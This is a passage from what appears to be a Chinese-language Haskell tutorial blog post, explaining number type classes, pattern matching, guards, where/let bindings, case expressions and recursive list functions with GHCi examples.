<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; :t (*)</span><br><span class="line">(*) :: <span class="type">Num</span> a =&gt; a -&gt; a -&gt; a</span><br></pre></td></tr></table></figure>
<p>它只取两个相同类型的参数，所以以下会报错</p>
<p><code>(5 :: Int) * (6 :: Integer)</code></p>
<p>这样是可以的<code>5 * (6 :: Integer)</code></p>
<blockquote>
<p>类型只有亲近<code>Show</code>和<code>Eq</code>，才可以加入<code>Num</code></p>
</blockquote>
<p><strong>Integral</strong></p>
<p>同样是表示数字的类型类，Num包含所有的数字：<strong>实数和整数</strong></p>
<p>而<code>Integral</code>仅包含整数，其中的成员类型有<code>Int</code>和<code>Integer</code></p>
<p><strong>Floating</strong></p>
<p><code>Floating</code>仅包含浮点类型：<code>Float</code>和<code>Double</code></p>
<h1 id="函数语法"><a href="#函数语法" class="headerlink" title="函数语法"></a>函数语法</h1><h2 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h2><p>简单例子，检查传入的数字是不是7</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">lucky</span> :: (<span class="type">Integral</span> a) =&gt; a -&gt; <span class="type">String</span></span><br><span class="line"><span class="title">lucky</span> <span class="number">7</span> = <span class="string">"number 7"</span></span><br><span class="line"><span class="title">lucky</span> x = <span class="string">"not 7"</span></span><br></pre></td></tr></table></figure>
<p>在调用<code>lucky</code>时，模式会从上至下进行检查，一旦有匹配，那对应的函数体就被应用了</p>
<p>这个模式唯一匹配的参数是7，如果不是7，就跳转到下一个模式，它匹配一切数值并将其绑定为x</p>
<p>稍复杂一些</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sayMe</span> :: (<span class="type">Integral</span> a) =&gt; a -&gt; <span class="type">String</span>   </span><br><span class="line"><span class="title">sayMe</span> <span class="number">1</span> = <span class="string">"One!"</span>   </span><br><span class="line"><span class="title">sayMe</span> <span class="number">2</span> = <span class="string">"Two!"</span>   </span><br><span class="line"><span class="title">sayMe</span> <span class="number">3</span> = <span class="string">"Three!"</span>   </span><br><span class="line"><span class="title">sayMe</span> <span class="number">4</span> = <span class="string">"Four!"</span>   </span><br><span class="line"><span class="title">sayMe</span> <span class="number">5</span> = <span class="string">"Five!"</span>   </span><br><span class="line"><span class="title">sayMe</span> x = <span class="string">"Not between 1 and 5"</span></span><br></pre></td></tr></table></figure>
<p>注意，如果把<strong>最后匹配一切的模式</strong>移到最前，那么结果就都是<code>Not between 1 and 5</code>了</p>
<p>阶乘(递归)</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">factorial</span> :: (<span class="type">Integral</span> a) =&gt; a -&gt; a   </span><br><span class="line"><span class="title">factorial</span> <span class="number">0</span> = <span class="number">1</span>   </span><br><span class="line"><span class="title">factorial</span> n = n * factorial (n - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>若是把第二个模式放在前面，就会捕获包括0在内的一切数字，这样计算就永远不会停止</p>
<blockquote>
<p>它总是优先匹配最符合的那个，最后才匹配万能的</p>
</blockquote>
<p>模式匹配也会失败，例如：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">charName</span> :: <span class="type">Char</span> -&gt; <span class="type">String</span>   </span><br><span class="line"><span class="title">charName</span> 'a' = <span class="string">"Albert"</span>   </span><br><span class="line"><span class="title">charName</span> 'b' = <span class="string">"Broseph"</span>   </span><br><span class="line"><span class="title">charName</span> 'c' = <span class="string">"Cecil"</span></span><br></pre></td></tr></table></figure>
<p>用没有考虑到的字符去调用它</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">ghci</span>&gt; charName 'a'   </span><br><span class="line"><span class="string">"Albert"</span>   </span><br><span class="line"><span class="title">ghci</span>&gt; charName 'b'   </span><br><span class="line"><span class="string">"Broseph"</span>   </span><br><span class="line"><span class="title">ghci</span>&gt; charName 'h'   </span><br><span class="line"><span class="string">"*** Exception: tut.hs:(53,0)-(55,21): Non-exhaustive patterns in function charName</span></span><br></pre></td></tr></table></figure>
<p>这表明，这个模式不够全面</p>
<blockquote>
<p>因此，定义模式时，一定要留一个万能匹配的模式，以使程序不会因为不可预料的输入而崩溃</p>
</blockquote>
<p>对Tuple也可以进行模式匹配</p>
<p>考虑二维空间的向量相加，如果不了解模式匹配，可能会写出这样的代码</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">addVectors</span> :: (<span class="type">Num</span> a) =&gt; (a, a) -&gt; (a, a) -&gt; (a, a)   </span><br><span class="line"><span class="title">addVectors</span> a b = (fst a + fst b, snd a + snd b)</span><br></pre></td></tr></table></figure>
<p>有更好的方法，上模式匹配：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">addVectors</span> :: (<span class="type">Num</span> a) =&gt; (a, a) -&gt; (a, a) -&gt; (a, a)   </span><br><span class="line"><span class="title">addVectors</span> (x1, y1) (x2, y2) = (x1 + x2, y1 + y2)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>考虑之前提到的问题</p>
<p><code>fst</code>和<code>snd</code>可以从序对中取出元素，三元组该怎么处理？</p>
</blockquote>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">first</span> :: (a,b,c) -&gt; a</span><br><span class="line"><span class="title">first</span> (x,_,_) = x</span><br><span class="line"><span class="title">second</span> :: (a,b,c) -&gt; b</span><br><span class="line"><span class="title">second</span> (_,y,_) = y_</span><br><span class="line"><span class="title">third</span> :: (a,b,c) -&gt; c</span><br><span class="line"><span class="title">third</span> (_,_,z) = z</span><br></pre></td></tr></table></figure>
<p>这里的<code>_</code>同样表示我们不关心这部分的具体内容</p>
<blockquote>
<p>在List Comprehension中使用模式匹配</p>
</blockquote>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; <span class="keyword">let</span> xs = [(<span class="number">1</span>,<span class="number">3</span>),(<span class="number">3</span>,<span class="number">4</span>),(<span class="number">7</span>,<span class="number">9</span>)]</span><br><span class="line">*<span class="type">Main</span>&gt; [a+b | (a,b) &lt;- xs]</span><br><span class="line">[<span class="number">4</span>,<span class="number">7</span>,<span class="number">16</span>]</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>x:xs</code>这种模式的应用非常广泛，尤其是递归函数</p>
<p>不过它只能匹配长度大于等于1的List</p>
<p>如果要把List的前三个元素都绑定到变量中，可以使用类似<code>x:y:z:xs</code>的形式</p>
<p>它只能匹配长度大于等于3的List</p>
<p><code>[1,2,3]</code>本质就是<code>1:2:3:[]</code>的语法糖</p>
</blockquote>
<p>已经知道了如何对List作模式匹配，现在实现我们自己的<code>head</code>函数</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">head'</span> :: [a] -&gt; a</span><br><span class="line"><span class="title">head'</span> [] = error <span class="string">"Can't call head on an empty list!"</span></span><br><span class="line"><span class="title">head'</span> (x:_) = x</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意，要绑定多个变量(用<code>_</code>也是如此)，必须用<code>()</code>括起来</p>
<p>同时注意<code>error</code>函数，它可以生成一个运行时错误，用参数中的字符串表示对错误的描述，并且会使程序直接崩溃</p>
</blockquote>
<p>这次用模式匹配和递归重新实现自己的<code>length</code>函数</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">length'</span> :: (<span class="type">Num</span> b) =&gt; [a] -&gt; b</span><br><span class="line"><span class="title">length'</span> [] = <span class="number">0</span></span><br><span class="line"><span class="title">length'</span> (_:xs) = <span class="number">1</span> + length' xs</span><br></pre></td></tr></table></figure>
<p>先定义好未知输入的结果——空List，也叫做边界条件</p>
<p>再在第二个模式中将这个List分割为头部和尾部</p>
<p>匹配头部用的<code>_</code>，因为我们并不关心它的值</p>
<blockquote>
<p>我们顾及了List所有可能的模式，第一个模式匹配空List，第二个模式匹配非空List</p>
</blockquote>
<p>再实现<code>sum</code></p>
<p>我们知道空List的和是0，就把它定义为一个模式，再考虑递归调用</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sum'</span> :: (<span class="type">Num</span> a) =&gt; [a] -&gt; a</span><br><span class="line"><span class="title">sum'</span> [] = <span class="number">0</span></span><br><span class="line"><span class="title">sum'</span> (x:xs) = x + sum' xs</span><br></pre></td></tr></table></figure>
<p>这里我们关心头部的值，所以用的<code>x</code>而不是<code>_</code></p>
<p><strong>as模式</strong></p>
<p>将一个名字和<code>@</code>置于模式前，可以在按模式分割时仍保留对整体的引用</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">capital</span> :: <span class="type">String</span> -&gt; <span class="type">String</span></span><br><span class="line"><span class="title">capital</span> <span class="string">""</span> = <span class="string">"Empty string!"</span></span><br><span class="line"><span class="title">capital</span> all@(x:xs) = <span class="string">"The first letter of "</span> ++ all ++ <span class="string">" is "</span> ++ [x]</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; capital <span class="string">"hello"</span></span><br><span class="line"><span class="string">"The first letter of hello is h"</span></span><br></pre></td></tr></table></figure>
<h2 id="Guards"><a href="#Guards" class="headerlink" title="Guards"></a>Guards</h2><p>一个<strong>guard</strong>就是一个布尔表达式，通常靠右缩进排成一列</p>
<p>如果为真，就使用对应的函数体，为假就送去下一个guard</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">func</span> :: (<span class="type">RealFloat</span> a) =&gt; a -&gt; <span class="type">String</span></span><br><span class="line"><span class="title">func</span> x</span><br><span class="line">    | x &lt;= <span class="number">10</span> = <span class="string">"x&lt;10"</span></span><br><span class="line">    | x &lt;= <span class="number">20</span> = <span class="string">"x&lt;=20"</span></span><br><span class="line">    | otherwise = <span class="string">"x&gt;20"</span></span><br></pre></td></tr></table></figure>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; func <span class="number">2</span></span><br><span class="line"><span class="string">"x&lt;10"</span></span><br><span class="line">*<span class="type">Main</span>&gt; func <span class="number">18</span></span><br><span class="line"><span class="string">"x&lt;=20"</span></span><br><span class="line">*<span class="type">Main</span>&gt; func <span class="number">30</span></span><br><span class="line"><span class="string">"x&gt;20"</span></span><br></pre></td></tr></table></figure>
<p>也可以传入参数进行运算后得出布尔值</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">func2</span> :: (<span class="type">RealFloat</span> a) =&gt; a -&gt; a -&gt; <span class="type">String</span>  </span><br><span class="line"><span class="title">func2</span> x y  </span><br><span class="line">    | x / y &lt; <span class="number">1</span> = <span class="string">"x / y &lt; 1"</span>  </span><br><span class="line">    | x / y &lt; <span class="number">2</span> = <span class="string">"x / y &lt; 2"</span>  </span><br><span class="line">    | otherwise = <span class="string">"otherwise"</span></span><br></pre></td></tr></table></figure>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; func2 <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="string">"x / y &lt; 1"</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>guard也可以塞在一行里，不过会丧失可读性，仅做展示，重写<code>max&#39;</code>函数</p>
</blockquote>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">max'</span> :: (<span class="type">Ord</span> a) =&gt; a -&gt; a -&gt; a</span><br><span class="line"><span class="title">max'</span> a b | a &gt; b = a | otherwise = b</span><br></pre></td></tr></table></figure>
<p>最后再实现一个自己的<code>compare</code>函数</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">myCompare</span> :: (<span class="type">Ord</span> a) =&gt; a -&gt; a -&gt; <span class="type">Ordering</span></span><br><span class="line"><span class="title">a</span> `myCompare` b</span><br><span class="line">    | a &gt; b     = <span class="type">GT</span></span><br><span class="line">    | a == b    = <span class="type">EQ</span></span><br><span class="line">    | otherwise = <span class="type">LT</span></span><br></pre></td></tr></table></figure>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; <span class="number">3</span> `myCompare` <span class="number">2</span></span><br><span class="line"><span class="type">GT</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用反单引号，不仅可以以中缀形式调用函数，也可以在定义函数的时候使用它</p>
</blockquote>
<p><strong>关键字Where</strong></p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">bmiTell</span> :: (<span class="type">RealFloat</span> a) =&gt; a -&gt; a -&gt; <span class="type">String</span>  </span><br><span class="line"><span class="title">bmiTell</span> weight height  </span><br><span class="line">    | bmi &lt;= skinny = <span class="string">"You're underweight, you emo, you!"</span>  </span><br><span class="line">    | bmi &lt;= normal = <span class="string">"You're supposedly normal. Pffft, I bet you're ugly!"</span>  </span><br><span class="line">    | bmi &lt;= fat    = <span class="string">"You're fat! Lose some weight, fatty!"</span>  </span><br><span class="line">    | otherwise     = <span class="string">"You're a whale, congratulations!"</span>  </span><br><span class="line">    <span class="keyword">where</span> bmi = weight / height ^ <span class="number">2</span>  </span><br><span class="line">          skinny = <span class="number">18.5</span>  </span><br><span class="line">          normal = <span class="number">25.0</span>  </span><br><span class="line">          fat = <span class="number">30.0</span></span><br></pre></td></tr></table></figure>
<p>跟在guard后面，最好与竖线缩进一致，可以定义多个名字和函数</p>
<p>这些名字对每个guard都是可见的，避免重复</p>
<p>也只对本函数可见，不会污染其他函数的命名空间</p>
<p>如果我们打算换种方式计算<code>bmi</code> ，只需要进行一次修改即可</p>
<p>并且因为只计算一次，效率也有所提升</p>
<blockquote>
<p>Where绑定也可以使用模式匹配</p>
</blockquote>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">where</span> bmi = weight / height ^ <span class="number">2</span>  </span><br><span class="line">      (skinny, normal, fat) = (<span class="number">18.5</span>, <span class="number">25.0</span>, <span class="number">30.0</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Where绑定中也可以定义函数</p>
</blockquote>
<p>这里实现计算一组bmi的函数</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">calcBmis</span> :: (<span class="type">RealFloat</span> a) =&gt; [(a, a)] -&gt; [a]  </span><br><span class="line"><span class="title">calcBmis</span> xs = [bmi w h | (w, h) &lt;- xs] </span><br><span class="line">    <span class="keyword">where</span> bmi weight height = weight / height ^ <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>这里我们因为不能依据参数直接进行计算，比如从传入的List中取出每个序对并计算对应的值，因此我们将bmi搞成一个函数</p>
<p><strong>关键词Let</strong></p>
<p>和<code>Where</code>绑定相似，<code>Let</code>绑定是个表达式，允许在任何位置定义局部变量</p>
<p>依据半径和高度求圆柱体表面积的函数：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">cylinder</span> :: (<span class="type">RealFloat</span> a) =&gt; a -&gt; a -&gt; a</span><br><span class="line"><span class="title">cylinder</span> r h = </span><br><span class="line">    <span class="keyword">let</span> sideArea = <span class="number">2</span> * pi * r * h</span><br><span class="line">        topArea = pi * r^<span class="number">2</span></span><br><span class="line">    <span class="keyword">in</span> sideArea + <span class="number">2</span> * topArea</span><br></pre></td></tr></table></figure>
<p><code>let</code> 的格式为 <code>let [bindings] in [expressions]</code>，在<code>let</code>中绑定的名字仅对<code>in</code>部分可见</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; cylinder <span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">12.566370614359172</span></span><br></pre></td></tr></table></figure>
<p>和where的差别在于，let绑定本身是表达式，而where绑定是语法结构</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; <span class="keyword">let</span> a = <span class="number">9</span> <span class="keyword">in</span> a + <span class="number">1</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>
<p>因为是表达式所以可以随处安放</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; [<span class="keyword">let</span> square x = x * x <span class="keyword">in</span> (square <span class="number">5</span>, square <span class="number">3</span>, square <span class="number">2</span>)]</span><br><span class="line">[(<span class="number">25</span>,<span class="number">9</span>,<span class="number">4</span>)]</span><br></pre></td></tr></table></figure>
<p>若要在一行中绑定多个名字，可以用分号将其分开</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">ghci</span>&gt; (<span class="keyword">let</span> a = <span class="number">100</span>; b = <span class="number">200</span>; c = <span class="number">300</span> <span class="keyword">in</span> a*b*c, <span class="keyword">let</span> foo=<span class="string">"Hey "</span>; bar = <span class="string">"there!"</span> <span class="keyword">in</span> foo ++ bar)  </span><br><span class="line">(<span class="number">6000000</span>,<span class="string">"Hey there!"</span>)</span><br></pre></td></tr></table></figure>
<p>可以在<code>let</code>绑定中使用模式匹配，以便从Tuple中取值等操作</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*<span class="type">Main</span>&gt; (<span class="keyword">let</span> (a,b,c) = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="keyword">in</span> a+b+c)</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>C++17结构化绑定？</p>
</blockquote>
<p><code>let</code>绑定也可以放到List Comprehension中</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">calcBmis</span> :: (<span class="type">RealFloat</span> a) =&gt; [(a, a)] -&gt; [a]  </span><br><span class="line"><span class="title">calcBmis</span> xs = [bmi | (w, h) &lt;- xs, <span class="keyword">let</span> bmi = w / h ^ <span class="number">2</span>]</span><br></pre></td></tr></table></figure>
<p>let做的只是绑定名字，还可以继续做过滤</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">calcBmis</span> :: (<span class="type">RealFloat</span> a) =&gt; [(a, a)] -&gt; [a]  </span><br><span class="line"><span class="title">calcBmis</span> xs = [bmi | (w, h) &lt;- xs, <span class="keyword">let</span> bmi = w / h ^ <span class="number">2</span>, bmi &lt;= <span class="number">20.0</span>]</span><br></pre></td></tr></table></figure>
<p>在 List Comprehension 中我们忽略了 <code>let</code> 绑定的 <code>in</code> 部分，因为名字的可见性已经预先定义好了</p>
<p>注意，在<code>|</code> 和<code>let</code>的中间不能使用bmi，还没有绑定</p>
<p>而竖线前面作为返回结果，是可以用bmi的</p>
<blockquote>
<p>把一个 <code>let...in</code> 放到限制条件中也是可以的，这样名字只对这个限制条件可见</p>
<p>在 ghci 中 <code>in</code> 部分也可以省略，名字的定义就在<strong>整个交互中可见</strong></p>
</blockquote>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">ghci</span>&gt; <span class="keyword">let</span> zoot x y z = x * y + z  </span><br><span class="line"><span class="title">ghci</span>&gt; zoot <span class="number">3</span> <span class="number">9</span> <span class="number">2</span>  </span><br><span class="line"><span class="number">29</span>  </span><br><span class="line"><span class="title">ghci</span>&gt; <span class="keyword">let</span> boot x y z = x * y + z <span class="keyword">in</span> boot <span class="number">3</span> <span class="number">4</span> <span class="number">2</span>  </span><br><span class="line"><span class="number">14</span>  </span><br><span class="line"><span class="title">ghci</span>&gt; boot  </span><br><span class="line">&lt; interactive&gt;:<span class="number">1</span>:<span class="number">0</span>: <span class="type">Not</span> <span class="keyword">in</span> scope: `boot'</span><br></pre></td></tr></table></figure>
<blockquote>
<p>最后的一点，let是个表达式，定义域限制的很小，因此不能在多个guard中使用</p>
<p>where因为是跟在函数体后面，把主函数体距离型别声明近一些会更易读</p>
</blockquote>
<h2 id="case-expressions"><a href="#case-expressions" class="headerlink" title="case expressions"></a>case expressions</h2><p>模式匹配本质上就是 <code>case</code> 语句的语法糖，这两段代码是完全等价的：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">head'</span> :: [a] -&gt; a  </span><br><span class="line"><span class="title">head'</span> [] = error <span class="string">"No head for empty lists!"</span>  </span><br><span class="line"><span class="title">head'</span> (x:_) = x</span><br></pre></td></tr></table></figure>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">head'</span> :: [a] -&gt; a  </span><br><span class="line"><span class="title">head'</span> xs = <span class="keyword">case</span> xs <span class="keyword">of</span> [] -&gt; error <span class="string">"No head for empty lists!"</span>  </span><br><span class="line">                      (x:_) -&gt; x</span><br></pre></td></tr></table></figure>
<p>case表达式的语法结构：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">case</span> expression <span class="keyword">of</span> pattern -&gt; result  </span><br><span class="line">                   pattern -&gt; result  </span><br><span class="line">                   pattern -&gt; result  </span><br><span class="line">                   ...</span><br></pre></td></tr></table></figure>
<p>函数参数的模式匹配只能在定义函数时使用，而case表达式可以用在任何地方</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">describeList</span> :: [a] -&gt; <span class="type">String</span>  </span><br><span class="line"><span class="title">describeList</span> xs = <span class="string">"The list is "</span> ++ <span class="keyword">case</span> xs <span class="keyword">of</span> [] -&gt; <span class="string">"empty."</span>  </span><br><span class="line">                                               [x] -&gt; <span class="string">"a singleton list."</span>   </span><br><span class="line">                                               xs -&gt; <span class="string">"a longer list."</span></span><br></pre></td></tr></table></figure>
<p>写成这样是等价的</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">describeList</span> :: [a] -&gt; <span class="type">String</span>  </span><br><span class="line"><span class="title">describeList</span> xs = <span class="string">"The list is "</span> ++ what xs  </span><br><span class="line">    <span class="keyword">where</span> what [] = <span class="string">"empty."</span>  </span><br><span class="line">          what [x] = <span class="string">"a singleton list."</span>  </span><br><span class="line">          what xs = <span class="string">"a longer list."</span></span><br></pre></td></tr></table></figure>
<p>what xs 应该看作一个函数</p>
<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>实现我们自己的maximum函数，模式匹配和递归的配合使用</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">maximum'</span> :: (<span class="type">Ord</span> a) =&gt; [a] -&gt; a</span><br><span class="line"><span class="title">maximum'</span> [] = error <span class="string">"maximum of empty list"</span></span><br><span class="line"><span class="title">maximum'</span> [x] = x</span><br><span class="line"><span class="title">maximum'</span> (x:xs)</span><br><span class="line">    | x &gt; maxTail = x</span><br><span class="line">    | otherwise = maxTail</span><br><span class="line">    <span class="keyword">where</span> maxTail = maximum' xs</span><br></pre></td></tr></table></figure>
<p>改用max函数，更清楚一些</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">maximum'</span> :: (<span class="type">Ord</span> a) =&gt; [a] -&gt; a</span><br><span class="line"><span class="title">maximum'</span> [] = error <span class="string">"maximum of empty list"</span></span><br><span class="line"><span class="title">maximum'</span> [x] = x</span><br><span class="line"><span class="title">maximum'</span> (x:xs) = max x (maximum' xs)</span><br></pre></td></tr></table></figure>
<p>简明扼要，一个List中的最大值就是它的首元素与尾部中最大值相比较得到的结果</p>
<p><strong>反转List</strong></p>
<p>边界条件是空List，若将一个List分割为头部和尾部，那么它反转的结果就是：反转后的尾部与原先的头部相连所得的List</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">reverse'</span> :: [a] -&gt; [a]</span><br><span class="line"><span class="title">reverse'</span> [] = []</span><br><span class="line"><span class="title">reverse'</span> (x:xs) = reverse' xs ++ [x]</span><br></pre></td></tr></table></figure>
<p>实现自己的<code>take</code>函数</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">take'</span> :: (<span class="type">Num</span> i, <span class="type">Ord</span> i) =&gt; i -&gt; [a] -&gt; [a]</span><br><span class="line"><span class="title">take'</span> n _</span><br><span class="line">    | n &lt;= <span class="number">0</span>    = []</span><br><span class="line"><span class="title">take'</span> _ [] = []</span><br><span class="line"><span class="title">take'</span> n (x:xs) = x : take' (n<span class="number">-1</span>) xs</span><br></pre></td></tr></table></figure>
<p>再实现<code>zip</code>函数，生成一组序对的List</p>
<p>取两个List作参数并将其捆绑在一起，两个边缘条件分别是两者为空List</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">zip'</span> :: [a] -&gt; [b] -&gt; [(a,b)]</span><br><span class="line"><span class="title">zip'</span> _ [] = []</span><br><span class="line"><span class="title">zip'</span> [] _ = []</span><br><span class="line"><span class="title">zip'</span> (x:xs) (y:ys) = (x,y):zip' xs ys</span><br></pre></td></tr></table></figure>
